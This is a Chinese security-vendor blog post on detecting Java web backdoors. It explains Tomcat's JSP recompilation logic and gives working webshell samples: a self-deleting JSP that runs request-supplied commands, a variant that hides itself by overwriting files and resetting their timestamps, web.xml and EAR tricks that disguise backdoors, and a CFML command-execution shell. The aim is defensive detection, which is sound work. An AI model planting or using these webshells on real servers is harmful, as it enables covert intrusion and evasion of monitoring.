有报告显示，在2019年，全国企业用户服务器病毒木马感染事件超百万起。其中WebShell恶意程序感染事件占73.27%; Windows恶意程序感染事件占18.05%；Linux恶意程序感染事件占8.68%。从感染主机中，总共发现超1万种木马病毒，其中WebShell 约占27%，Windows木马病毒约占61%，Linux木马病毒约占12%。可见，主机入侵检测技术在主机安全防护领域的重要性愈加凸显。


对于企业而言，如果主机被攻击者留下了隐藏的后门，是怎样进行检测的呢？面对一个大中型的主机系统，数以百万级的代码行，企业又该如何快速发现文件被篡改以及被篡改的位置呢？



主机作为企业的最后一道防线，一旦失陷，将给企业将带来重大损失。面对黑客变化不穷的攻击行为，企业自身应该如何避免攻击？

  1. 安装主机安全类产品。企业可以提前做好安全防御措施，通过主机安全软件实时查看主机的安全情况，定期检测系统及软件中的安全漏洞和入侵行为，将可能存在的隐患“挖出来”。

  2. 定期关注网络安全公告，并及时按官方建议修复披露的漏洞。尤其注意“远程代码执行”、“未授权访问”等关键字的漏洞，因为这类漏洞更容易被攻击者利用。

  3. 培养员工安全意识。比如对严格把控安全修复进程，特别涉及到个人负责的组件，要及时完成漏洞和补丁的修复等。




牧云（CloudWalker）主机安全管理平台是一款基于Agent检测的主机安全管理平台，具备资产清点、风险感知、入侵检测、安全合规检查等能力，且兼容容器化场景。自发布以来，入侵检测能力广受客户好评。据某客户产品测试现场的反馈，在部署牧云(CloudWalker)主机安全管理平台的当天，即发现在攻防演练过程中遗留的20多个WebShell（后来协助客户将其删除）。



本文将结合实际应用，从JSP/JSPX检测、后缀、冷门的后门检测等方面，分享牧云（CloudWalker）在做Java Web后门检测时的经验心得。




关于JSP/JSPX处理流程的那些事



说到Java Web的相关后门，首先想到的就是关于JSP（JavaServer Pages）以及JSPX（可以理解为XML格式的JSP）。


了解JSP/JSPX相关的一些后门技巧，首先需要了解一下JSP/JSPX的处理流程，以Tomcat为例子：


请求JSP的流程大致如下：在第一次请求相应的JSP时，会将jsp进行一轮jsp语法的解析，解析主要是从jsp的语法解析到java语法，在默认为work的目录下生成相应的java文件（内容本质是一个Servlet），之后在对java文件进行编译，生成对应的class文件并且加载到JVM中。用户在访问xxx.jsp的时候，实际是这个jsp对应的serlvet在处理请求。对于JSP是否重复编译主要取决于developmentm mode的配置，在开发模式关闭的时候，默认情况下不会对JSP进行重复的编译，而在开发模式开启的时候，每一次请求都会判断是否要进行重新编译，如果判断Servlet已经过时，就会对于JSP进行重新编译。



而对于JSPX请求的流程其实和JSP基本是大同小异的，区别是在解析的时候，JSPX需要先进行XML文档的解析。



综上所述：有两种情况会进入是否需要进行重新编译的判断，在JspServelet是第一次进行处理时和处在开发模式下。


在是否编译的方法中，主要是根据org.apache.jasper.compiler.Compiler#isOutDated()来判断是否需要进行重新的编译，isOutDated()方法判断的依据有几个角度：

  1. 距离上一次判断的时长：根据的是ModificationTestInterval的配置（在Tomcat中默认是4s），只有在上一次判断时间距离本次判断时间大于ModificationTestInterval配置的时间时，才会继续下面的判断，否则isOutDated()为false

  2. JSP文件是否进行过了修改：根据的是JSP文件的修改时间和java文件/class文件的修改时间（文件系统中的modify time）进行对比，不相同则说明进行了修改，需要重新编译

  3. JSP中的依赖是否进行了修改：对于每一个JspServlet，在他的封装对象中wrapper中存在这个JSP依赖文件的缓存的修改时间。根据文件系统中的依赖文件的真实修改时间和wrapper中的依赖缓存的修改时间进行对比判断依赖是不是已经修改了。


从这个编译机制可以看出，其实JSP和处理用户的请求的Servlet可能会存在一定的差异，接下来看看利用这一点是否可以绕过主机侧的防护。





一些对抗检测的手段



目前有一些主机侧检测WebShell因为性能原因采取定期扫描的策略，利用Tomcat内存中缓存Servlet的机制，可以来绕过这类的策略。


根据上面描述的流程，在生产环境下，仅仅在第一次的请求时会对JSP进行解析编译处理，所以我们可以上传一个自删除的JSP，在第一次访问之后进行自删除，之后我们的访问请求依然可以依靠已经在内存中实例化的Servlet来处理。


<%@ page import="java.io.*" %>

<%@ page import="java.nio.file.Files" %>

<%@ page import="java.nio.file.Paths" %>

<%@ page import="java.net.URI" %>

<%@ page import="java.net.URISyntaxException" %>

<%

    //evil code

    if ("2".equals(request.getParameter("flag"))){

        Runtime.getRuntime().exec(request.getParameter("test"));

    }

%>

<%!

    public void removeFile(String filePath) throws IOException, URISyntaxException {

        Files.delete(Paths.get(filePath));

    }

%>

<%

    if ("1".equals(request.getParameter("flag"))) {            

        removeFile("pathToJSP/test.jsp");    }%>


在第一次访问的时候请求flag=1既可以删除掉JSP，之后利用?flag=2&test=command依然可以访问。


但是如果处在开发模式下就不存在上述的攻击场景了。Tomcat默认是开启了开发模式的，如果开发模式开启了，我们又如何逃脱检测呢？在开启了开发模式的情况下，超过间隔时间的访问会导致一轮的是否重新编译的判断，这时候要是发现文件删除了，就会触发重新的编译，导致无法继续访问。这时候我们考虑是否有机会伪造一个正常的JSP，驻留在文件系统中，来干扰防守者的判断。由于是否重新编译的判断是在ModificationTestIntervald的间隔时间内进行判断（默认为4s），所以可以利用这个特点，先写入一个包含后门的JSP，在访问成功之后，同时修改class和java还有JSP文件，并且使他们的修改时间为与之前的修改时间相同的值即可绕过重新的编译机制。


<%@ page import="java.io.*" %>

<%

    //evil code

    if ("2".equals(request.getParameter("flag"))){ 

        Runtime.getRuntime().exec(request.getParameter("test"));

    }

%>

<%!

    public void changeFileAndSetModifyTime(File file,long modifyTime) throwsIOException{        

        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file));

        bufferedWriter.write("safecode");

        bufferedWriter.flush();

        bufferedWriter.close();

        file.setLastModified(modifyTime);

    }

%>

<%

    if ("1".equals(request.getParameter("flag"))) {

        File file = new File("pathToJSP/test.jsp");

        File file1 = new File("pathToWorkDirClass/test_jsp.class");

        File file2 = new File("pathToWorkDirJava/test_jsp.java");

        long modifyTime = file.lastModified();

        changeFileAndSetModifyTime(file, modifyTime);

        changeFileAndSetModifyTime(file1, modifyTime);

        changeFileAndSetModifyTime(file2, modifyTime);

    }

%>


请求flag=1即可修改jsp&&java&&class文件伪造成安全的代码且不会触发重新编译，使得当前载入的servlet一直是恶意的servlet，但在文件系统中的文件已经是被修改过的无害代码了。


在Tomcat中还有关于reloadable的配置，开启这个属性会使得Tomcat拉起一个后台的监控线程来监控相关文件夹的变化（监控WEB-INF/lib以及WEB-INF/classes），对于以war包部署的springboot形式的应用，如果开启了这个选项，攻击者可以上传一个编译好的controller的class文件(classes目录默认不会监控新增文件，但是lib目录会,所以可以随意上传一个合法的jar到lib目录下，触发reload，Tomcat就会把新上传的classes重新加载进去)，当然也可以对现有的class文件进行修改覆盖来逃避对于新文件的检测。





 对抗绕过的方法 



上述说的前两种对抗检测的方式，都需要先上传一个真实的恶意JSP，然后清理文件系统中存在的恶意文件痕迹，使JSPServlet驻留在内存中。在检测的时候，需要注意的就是要能及时发现文件修改或者新增文件的事件，这样才能捕捉到恶意的新文件或者修改后的文件，但是同时对于文件夹的文件事件监控又是比较耗费性能的，考虑到主机防护对于性能的要求，需要进行权衡考虑。




关于后缀检测的那些事



Web后门的检测始终绕不过一些关于后缀的规则，需要判断什么后缀的文件以什么类型的形式进行解析检测。


对于Java生态的主要的特色文件后缀主要可以分成几类：

  • JSP类型：主要有JSP，JSPF，JSPF全称为JSP fragment，语法和JSP一致，在Resin以及Jetty中支持独立解析。

  • JSPX类型：可以看成是JSP的xml描述，和JSP的语法基本一一对应

  • 归档类型：这部分的种类比较多，用于打包部署，最常见的主要有war，jar，还有在Java EE服务器中支持的ear，其他比较冷门的有用来描述webservice的aar，jboss特有的用于mbeanService的sar等等。

  • 其他类型：这部分的就比较杂了，通常是一些框架自定义的语言，比如CFM，或是一些第三方的脚本引擎比如bsh，这些文件类型可能被一些服务器的支持。


回到主机防护上来，有些主机防护对于后门的检测依赖于通过文件名后缀来判断文件类型，这是比较不靠谱的。比如考虑一个比较常见的攻击，攻击者可以控制上传任意的war包的场景。只需要在打包好的war文件中的web.xml配置好相应的路由规则，就可以将css后缀的文件交给JSPServlet来进行处理。


 <servlet-mapping>
        <servlet-name>jsp</servlet-name>
        <url-pattern>*.css</url-pattern>
    </servlet-mapping>


利用这个配置，我们就可以把我们的JSP代码放在css中，伪装成静态资源从而绕过检测。


而对于单个JSP页面来说，在JSP/JSPX中支持如下的形式来直接include一个页面，这种类型写法的include是在编译JSP到Servlet的期间进行处理的。


<%@include file="shell"%>
<jsp:directive.include file="shell"/>


对于Tomcat来说，在这部分的处理流程中，逻辑在org.apache.jasper.compiler.Parser#processIncludeDirective,其中并没有对于include的文件的后缀进行判断，我们可以include任意符合JSP语法，任意后缀的文件，在JSP的compile的过程中就会将符合JSP语法的文件进行解析编译。


还有一些情况，比如在一些J2EE的服务器里面支持部署EAR，其中的配置支持ear中的war包的部署，我们可以构造一个EAR中嵌套WAR，然后利用application.xml中指定web模块进行部署


<module id="">
            <web>
                  <web-uri>Shell.war</web-uri>
                  <context-root>Shell</context-root>
            </web>
      </module>


综上所述，其实利用后缀来判断文件类型进行检测是及其不靠谱的，这就给主机侧的WebShell检测带来比较严峻的挑战，如果对于Web目录中所有后缀的文件都进行WebShell检测，如何判断文件对应的类型来进行相应的检测是一个问题，而且在静态资源较多的情况时，可能会给检测引擎的性能带来比较大的挑战，并且还可能会产生比较多的误报。


但是其实对于Tomca/Resin等java服务器来说，在后门上传的部分，无论是修改url匹配规则也好，使用directive include也好，最后都需要在 配置中的scratchdir目录（默认为work目录）生成java/class文件，然后java服务器会将相应的class文件进行加载，所以判断生成java/class文件生成目录并检测相应的java/class文件就是扼住了后门的咽喉。而像JBoss等一些JavaEE服务器，攻击者利用EAR嵌套War部署，也会在比如tmp目录下生成对应的java/class文件，利用对于这些目录的监控，可以屏蔽掉一些jsp/jspx在编译阶段的trick，或是一些部署时候根据配置文件解析的trick，从而进行更加有效的检测。




关于一些可能比较冷门的后门以及相应的技术


有一些比较冷门的Java服务器相关技术可能平常用的比较少，但是考虑到主机检测的全面性，也应该放到考虑范围内。





 ColdFusion Markup Language 


CFML在ColdFusion中使用的比较多，但这种类型的Webshell也不仅仅存在于ColdFusion。攻击者利用这个WebShell，可以执行系统命令。主要的逻辑就是读取请求中的cmd，opts的值，然后利用cfexecute标签来执行系统命令。


<cfif isdefined("form.cmd")>
<cfsavecontent variable="myVar">
<cfexecute name = "#Form.cmd#"
  arguments = "#Form.opts#"
  timeout = "#Form.timeout#">
</cfexecute>
</cfsavecontent>
<pre>
#HTMLCodeFormat(myVar)#
</pre>
</cfif>


可以发现CFML和JSP的语法还是比较接近的，有点类似于JSTL这种拓展标签库的语法，利用一些特定的标签来实现代码功能，在https://cfdocs.org/中可以查找到各个标签相应的用法。


同时，在coldfusion2018中可以发现，wwwroot目录下的cfm文件都已经是已经编译好的class文件，反编译看看。



可以看到其中也掉用了一些servlet.jsp中的类，其实ColdFusion Enterprise版本也支持JSP的格解析，直接上传JSP到wwwroot目录下就可以，处理JSP的时候也同样会在work目录下生成对应的java以及class文件。





 AAR 



aar文件在Apache Axis2中比较常用，Axis2是Apache下的一个重量级WebService框架,准确说它是一个Web Services/ SOAP / WSDL的引擎,它比较全面的集成了Web Service框架。利用它能制作和发布Web Service应用，其实aar格式和jar/war类似，只不过aar文件用来描述一个webservice。以Tomcat集成axis2为例子，将axis2的war包解压到webapp目录下，然后我们制作一个恶意的webservices服务，打包成aar，一个典型的aar应该包含一个描述service的service.xml文件，放到webapps/axis2/WEB-INF/services下即可,在检测aar的时候需要注意的是，在其中，类中定义的所有方法可能均是入口，可以由http协议进行调用。




总结



对于主机侧防护Java Web后门来说，有几个点比较值得注意的策略：

  1. 不要采取定时扫描的策略，对于敏感文件目录，应该根据文件事件来做实时的监控

  2. 对于后门的检测，尽量不要依赖于文件名后缀来推断文件类型检测

  3. 由于jsp/jspx等文件编译的复杂性，尽量在源头检测编译完的java/class，可以防止一些编译的trick

  4. 根据不同的归档文件类型（war，jar，aar，ear等），应该制定一些相应的特制的检测策略
